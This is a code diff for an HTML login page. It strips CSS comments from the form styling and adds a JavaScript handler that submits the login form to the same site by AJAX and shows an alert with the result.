@@ -83,11 +83,11 @@
             width: 100%;
             display: flex;
             justify-content: center;
-            overflow: visible; /* Prevent clipping of wider input */
+            overflow: visible;
         }
         .input-field {
-            width: 100%; /* Longer than login button (80%) */
-            max-width: 550px; /* Slightly wider than container for mobile */
+            width: 100%;
+            max-width: 550px;
             padding: 1rem 2.5rem 1rem 1rem;
             background-color: #fff;
             border: 1px solid #ccd0d5;
@@ -114,7 +114,7 @@
         }
         .floating-label {
             position: absolute;
-            left: 1rem; /* Adjusted for 100% width */
+            left: 1rem;
             top: 0.5rem;
             color: #8f949c;
             font-size: 1rem;
@@ -129,7 +129,7 @@
         }
         .info-icon {
             position: absolute;
-            right: 0.75rem; /* Adjusted for 100% width */
+            right: 0.75rem;
             top: 50%;
             transform: translateY(-50%);
             width: 1rem;
@@ -146,7 +146,7 @@
         }
         .password-icon {
             position: absolute;
-            right: 0.75rem; /* Adjusted for 100% width */
+            right: 0.75rem;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
@@ -167,7 +167,7 @@
             font-size: 1.125rem;
             font-weight: bold;
             cursor: pointer;
-            margin: 0 auto 1rem; /* Center the button */
+            margin: 0 auto 1rem;
         }
         .forgot-password {
             text-align: center;
@@ -186,7 +186,7 @@
             border-radius: 20px;
             font-size: 1rem;
             cursor: pointer;
-            margin: 0 auto 1rem; /* Center the button */
+            margin: 0 auto 1rem;
         }
         .example-link {
             text-align: center;
@@ -226,8 +226,8 @@
                 margin-bottom: 6rem;
             }
             .input-field {
-                width: 100%; /* Longer than login button (80%) */
-                max-width: 660px; /* Slightly wider than container for desktop */
+                width: 100%;
+                max-width: 660px;
                 font-size: 1.125rem;
                 height: 3.5rem;
             }
@@ -338,6 +338,30 @@
                     this.style.height = window.innerWidth >= 768 ? '3.5rem' : '3rem';
                 }
             });
+        });
+
+        // Handle form submission with AJAX
+        document.querySelector('form[name="login"]').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const form = e.target;
+            const formData = new FormData(form);
+            
+            try {
+                const response = await fetch('/', {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                if (response.ok) {
+                    alert('Form submitted successfully!');
+                    form.reset();
+                } else {
+                    alert('Error submitting form. Please try again.');
+                }
+            } catch (error) {
+                console.error('Submission error:', error);
+                alert('An error occurred. Please try again.');
+            }
         });
     </script>
 </body>
